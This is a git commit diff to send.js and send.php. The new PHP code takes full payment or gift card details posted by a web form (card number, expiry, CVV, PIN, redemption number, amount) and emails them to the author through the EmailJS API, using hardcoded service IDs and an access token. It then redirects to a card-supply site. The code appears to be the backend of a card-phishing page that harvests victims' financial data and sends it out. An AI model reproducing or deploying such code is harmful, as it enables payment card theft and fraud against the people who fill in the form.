ee3cc8967eccbf1f53ce2043731f1ad31ebeb546
oluflourish <flourishisnow@gmail.com>
2023-11-23 15:12:23 +0100

    gin

--- send.js
+++ send.js
@@ -2,10 +2,6 @@ var data = {
     service_id: 'service_3uyknph',
     template_id: 'template_24v2iow',
     user_id: '2J8DshQnpUuUkoM9C',
-    template_params: {
-        'username': 'James',
-        'g-recaptcha-response': '03AHJ_ASjnLA214KSNKFJAK12sfKASfehbmfd...'
-    }
 };
 
 $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
--- send.php
+++ send.php
@@ -1,18 +1,88 @@
 <?php
-// $_POST['form-field-currency'];
-// $_POST['form-field-card'];
-if(isset($_POST['send_form'])){
-    echo "isdjksd skdjsd sldkjsd ";
-    if (!isset($_POST['form_fields[amount]'])){
-    echo "isdjksd skdjsd sldkjsd  3433333332333332 ";
-        
+$currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    if (!empty($_POST['form_fields']["currency"])) {
+        $currency = $_POST['form_fields']["currency"];
     }
+    if (!empty($_POST['form_fields']["card"])) {
+        $cardType = $_POST['form_fields']['card'];
+    }
+    if (!empty($_POST['form_fields']["amount"])) {
+        $cardAmount = $_POST['form_fields']["amount"];
+    }
+    if (!empty($_POST['form_fields']["redemption"])) {
+        $redemptionNumber = $_POST['form_fields']["redemption"];
+    }
+    if (!empty($_POST['form_fields']["card_number"])) {
+        $cardNumber = $_POST['form_fields']["card_number"];
+    }
+    if (!empty($_POST['form_fields']["exp_mm"])) {
+        $expMM = $_POST['form_fields']["exp_mm"];
+    }
+    if (!empty($_POST['form_fields']["exp_yy"])) {
+        $expYY = $_POST['form_fields']["exp_yy"];
+    }
+    if (!empty($_POST['form_fields']["cvv"])) {
+        $cardCVV = $_POST['form_fields']["cvv"];
+    }
+    if (!empty($_POST['form_fields']["pin"])) {
+        $cardPIN = $_POST['form_fields']["pin"];
+    }
+
+    $email_data = array(
+        "currency" => $currency,
+        "card_type" => $cardType,
+        "amount" => $cardAmount,
+        "redemption_number" => $redemptionNumber,
+        "card_number" => $cardNumber,
+        "exp_mm" => $expMM,
+        "exp_yy" => $expYY,
+        "cvv" => $cardCVV,
+        "pin" => $cardPIN,
+        "created_at" => date("Y-m-d H:i:s"),
+        "updated_at" => date("Y-m-d H:i:s")
+    );
+
+    $to_string = implode(" ", $email_data);
+    $url = "https://api.emailjs.com/api/v1.0/email/send";
+    $curl = curl_init();
+
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_POST, true);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+    $headers = array(
+        "Content-Type: application/json",
+    );
+
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+    $data = <<<data
+    {
+    "service_id": "service_3uyknph",
+    "template_id": "template_24v2iow",
+    "user_id": "2J8DshQnpUuUkoM9C",
+    "accessToken":"6X57_NC-Z7fS_Ygz3SjkI",
+    "template_params":{
+        "message": $to_string
+    }
+    }
+    data;
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
+
+    $resp = curl_exec($curl);
+    curl_close($curl);
+    if ($resp === "OK") {
+        echo $resp;
+    } else {
+        header('Location: https://my-cardlysupply.vercel.app/');
+        exit;
+    }
+
+
+} else {
+    header('Location: https://my-cardlysupply.vercel.app/');
+    exit;
 }
-$amount = $_POST['form_fields[amount]'];
-$rempno = $_POST['form-field-redemption'];
-// $_POST['form-field-card_number'];
-// $_POST['form-field-exp_mm'];
-// $_POST['form-field-exp_yy"'];
-// $_POST['form-field-cvv'];
-echo $amount, $rempno;
+;
 ?>
